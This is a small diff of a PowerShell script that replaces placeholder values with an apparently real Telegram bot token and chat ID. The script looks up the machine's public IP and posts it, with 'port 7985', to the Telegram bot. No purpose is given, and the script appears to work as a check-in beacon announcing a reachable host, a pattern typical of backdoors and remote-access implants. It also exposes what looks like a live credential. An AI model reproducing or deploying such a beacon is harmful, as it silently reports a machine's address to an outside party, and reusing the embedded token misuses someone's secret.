@@ -1,5 +1,5 @@
-$api = "123abc:your_token_here"
-$id = "123123123"
+$api = "7500269752:AAEwOhnqnqTfwtsGfusUwD7wQ6nr_qYSuic"
+$id = "7914319345"
 $ip = (Invoke-RestMethod -Uri "https://api.ipify.org?format=text").Trim()
 $msg = "computer [$ip] port 7985"
 Invoke-RestMethod -Uri "https://api.telegram.org/bot$api/sendMessage" -Method Post -Body @{chat_id = $id; text = $msg} | Out-Null
